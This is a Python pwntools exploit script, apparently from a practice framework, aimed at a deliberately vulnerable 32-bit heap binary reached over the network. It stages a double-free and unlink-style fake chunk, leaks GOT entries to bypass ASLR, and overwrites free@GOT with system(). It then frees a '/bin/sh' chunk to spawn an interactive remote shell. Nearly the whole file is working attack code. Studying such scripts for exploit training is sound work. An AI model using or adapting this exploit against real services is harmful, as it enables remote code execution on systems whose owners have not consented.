#! /usr/bin/python
#coding:utf-8
'''Heap_DoubleFree - Ret2libc (ALSR - on)'''

import sys
sys.path.append("../..")
from pwn import *
from modules.script_tools import *

property = {
    'libc_free':0x0,
    'libc_sys':0x0,
    '&p0':0x0,
    'got':0x0    #in fact gets@got
    }
# read options from share
options = {'dIP' :  get_share('dIP'),
                'port' : get_share('port'),
                'wait' : get_share('wait')}

# find libc
libc = ELF('/lib32/libc-2.23.so')
property['libc_sys'] = libc.symbols['system']
property['libc_free'] = libc.symbols['free']
# find &p0 and got
libc = ELF('../../vulnerabilities/heap/heap32')
property['got'] = libc.got['gets']      #in fact gets@got
property['&p0'] = libc.symbols['a'] + 4*2000

# begin exploit
ip, port = options['dIP'], int(options['port'])
p = remote(ip, port)
if eval(options['wait']):
    _ = raw_input("Press Any Key to Begin.")

def new_chunk(size,content):
    while p.can_recv() : p.recvline()
    p.sendline('m')
    p.recvline() # malloc
    p.recvline() # size
    p.sendline(str(size))
    p.recvline() # content
    p.sendline(content)
    p.recvuntil('!\n') # ok

def free_chunk(no):
    while p.can_recv() : p.recvline()
    p.sendline('f')
    p.recvline() # free
    p.sendline(str(no))
    p.recvuntil('!\n') # ok

def edit_chunk(no,content):
    while p.can_recv() : p.recvline()
    p.sendline('e')
    p.recvline() # edit
    p.sendline(str(no))
    p.sendline(content)
    p.recvline('!\n') # ok

def print_chunk(no):
    while p.can_recv() : p.recvline()
    p.sendline('p')
    p.recvline() # print
    p.sendline(str(no))
    return p.recvuntil('end')

new_chunk(504,'A'*504)
new_chunk(512,'B'*512)

free_chunk(0)
free_chunk(1)

#关键payload
content = p32(0x0)  + p32(0x1f9) + p32(property['&p0'] - 0xc) + p32(property['&p0'] - 0x8) + 'a' * (0x200 - 24) + p32(0x1f8) + p32(0x108)
new_chunk(768, content)

new_chunk(20,'/bin/sh')

free_chunk(1)

content = 'a'*12 + p32(property['got'])
edit_chunk(0,content)


# leak GOT
print 'leak GOT...'
rec = print_chunk(0)

ans=[]
#for i in rec: print hex(ord(i)),
for i in range(0,8):
    ans.append(rec[i*4:i*4+4])
gets = u32(ans[0])
free_addr = u32(ans[1])
getchar = u32(ans[2])
malloc = u32(ans[3])
puts = u32(ans[4])
gmon_start__  = u32(ans[5])
libc_start_main = u32(ans[6])
isoc99_scanf = u32(ans[7])

sys_addr = free_addr - property['libc_free'] + property['libc_sys']

print '\t\tfree_addr = ' + hex(free_addr)
print '\t\tsystem_addr = ' + hex(sys_addr)

# overwrite GOT
print 'overwrite GOT...'
content = p32(gets) + p32(sys_addr) + p32(getchar) + p32(malloc) + p32(puts) + p32(gmon_start__) + p32(libc_start_main) + p32(isoc99_scanf)
edit_chunk(0,content)


while p.can_recv() : p.recvline()
p.sendline('f')
p.recvline() # free
p.sendline('3')

print "\tfree(a[2003]) ===> system('/bin/sh')"
p.interactive()





